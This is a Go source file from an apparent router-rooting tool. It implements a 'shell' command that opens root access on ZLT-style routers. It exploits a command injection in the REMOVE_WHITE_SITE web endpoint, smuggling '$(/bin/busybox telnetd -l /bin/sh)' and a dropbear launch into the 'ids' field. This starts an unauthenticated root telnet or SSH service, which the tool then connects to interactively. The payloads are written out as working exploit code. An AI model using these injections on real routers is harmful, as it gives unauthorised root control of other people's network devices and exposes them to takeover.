package cmd

import (
	"fmt"
	"strings"
	"time"

	log "github.com/sirupsen/logrus"
	"github.com/spf13/cobra"

	"github.com/anusara-bemal/zlt_xloader/internal/profile"
	"github.com/anusara-bemal/zlt_xloader/internal/sshclient"
	"github.com/anusara-bemal/zlt_xloader/internal/telnet"
	"github.com/anusara-bemal/zlt_xloader/pkg/netutil"
)

var (
	shellCommand string
	shellAT      bool
	shellSSH     bool
	shellSSHPort int
	shellSSHUser string
	shellSSHPass string
)

// ensureShell opens a root shell on the router, enabling telnet through the
// REMOVE_WHITE_SITE injection if port 23 is closed.
func ensureShell() (*telnet.Client, error) {
	// The injection endpoint requires an authenticated session even when
	// telnet is already running. Login is best-effort: some firmware builds
	// reject a second login while a session is active, which is harmless.
	if err := app.API.Login(app.Profile.Login.Username, app.Profile.Login.Password); err != nil {
		log.WithError(err).Warn("[shell] login failed; continuing with existing session")
	}

	if !netutil.ScanPort(app.Target, 23, app.Timeout) {
		log.Info("[shell] telnet closed; enabling via injection")
		r := app.API.Try(profile.Payload{
			ID: "REMOVE_WHITE_SITE", Method: "POST",
			Args: map[string]string{
				"isTest": "false",
				"ids":    "1 $(/bin/busybox telnetd -l /bin/sh)",
			},
		})
		if r.Err != nil {
			return nil, fmt.Errorf("enable telnet: %w", r.Err)
		}
		for i := 0; i < 20; i++ {
			if netutil.ScanPort(app.Target, 23, app.Timeout) {
				break
			}
			time.Sleep(200 * time.Millisecond)
		}
	}
	if !netutil.ScanPort(app.Target, 23, app.Timeout) {
		return nil, fmt.Errorf("telnet is not available on %s:23", app.Target)
	}
	return telnet.Dial(app.Target, 23, 3*time.Second)
}

// ensureSSH opens an SSH shell, best-effort enabling dropbear if port 22 is
// closed. It mirrors ensureShell but targets the SSH transport.
func ensureSSH() (*sshclient.Client, error) {
	if err := app.API.Login(app.Profile.Login.Username, app.Profile.Login.Password); err != nil {
		log.WithError(err).Warn("[shell] login failed; continuing with existing session")
	}

	if !netutil.ScanPort(app.Target, shellSSHPort, app.Timeout) {
		if app.DryRun {
			log.Warn("DRY-RUN: SSH enable injection suppressed")
		} else {
			log.Infof("[shell] SSH closed on %d; trying to start dropbear", shellSSHPort)
			r := app.API.Try(profile.Payload{
				ID: "REMOVE_WHITE_SITE", Method: "POST",
				Args: map[string]string{
					"isTest": "false",
					"ids":    fmt.Sprintf("1 $(/usr/sbin/dropbear -p %d 2>/dev/null || dropbear -p %d 2>/dev/null)", shellSSHPort, shellSSHPort),
				},
			})
			if r.Err != nil {
				return nil, fmt.Errorf("enable SSH: %w", r.Err)
			}
			for i := 0; i < 20; i++ {
				if netutil.ScanPort(app.Target, shellSSHPort, app.Timeout) {
					break
				}
				time.Sleep(200 * time.Millisecond)
			}
		}
	}
	if !netutil.ScanPort(app.Target, shellSSHPort, app.Timeout) {
		return nil, fmt.Errorf("SSH is not available on %s:%d (run 'persist --dry-run=false --yes' to install it at boot)", app.Target, shellSSHPort)
	}

	user, pass := shellSSHUser, shellSSHPass
	if user == "" {
		user = app.Profile.Login.Username
	}
	if pass == "" {
		pass = app.Profile.Login.Password
	}
	return sshclient.Dial(app.Target, shellSSHPort, user, pass, 5*time.Second)
}

var shellCmd = &cobra.Command{
	Use:   "shell",
	Short: "Open an interactive root shell (or run a single command)",
	Long: `Opens a root shell on the router. The default transport is telnet; if
port 23 is closed it is enabled first using the REMOVE_WHITE_SITE injection.

Pass --ssh to use the SSH transport instead (port 22). If SSH is not running,
the tool makes a best-effort attempt to start dropbear before connecting.

Use --command to run one command non-interactively, and --at to send a raw
AT command to the modem instead of a shell command.`,
	RunE: func(cmd *cobra.Command, args []string) error {
		if app.DryRun {
			log.Warn("DRY-RUN: shell enablement injection is suppressed; connecting only if the service is already open")
		}

		command := shellCommand
		if shellAT && command != "" {
			// The firmware ships /bin/at_cmd for modem AT commands.
			command = "at_cmd " + command
		}

		if shellSSH {
			client, err := ensureSSH()
			if err != nil {
				return err
			}
			defer client.Close()

			if command == "" {
				fmt.Println("Connected over SSH. Type 'exit' to leave.")
				return client.Interactive()
			}
			out, err := client.Run(command, 8*time.Second)
			if err != nil {
				return err
			}
			fmt.Print(strings.TrimSpace(out))
			fmt.Println()
			return nil
		}

		client, err := ensureShell()
		if err != nil {
			return err
		}
		defer client.Close()

		_, _ = client.Expect("# ", 3*time.Second)

		if command == "" {
			fmt.Println("Connected. Type 'exit' to leave.")
			return client.Interactive()
		}
		out, err := client.Run(command, "# ", 8*time.Second)
		if err != nil {
			return err
		}
		fmt.Print(strings.TrimSpace(out))
		fmt.Println()
		return nil
	},
}

func init() {
	shellCmd.Flags().StringVar(&shellCommand, "command", "", "run a single command instead of opening a shell")
	shellCmd.Flags().BoolVar(&shellAT, "at", false, "treat --command as a raw AT command")
	shellCmd.Flags().BoolVar(&shellSSH, "ssh", false, "use SSH instead of telnet")
	shellCmd.Flags().IntVar(&shellSSHPort, "ssh-port", 22, "SSH port on the router")
	shellCmd.Flags().StringVar(&shellSSHUser, "user", "", "SSH username (default: profile login user)")
	shellCmd.Flags().StringVar(&shellSSHPass, "password", "", "SSH password (default: profile login password)")
	rootCmd.AddCommand(shellCmd)
}
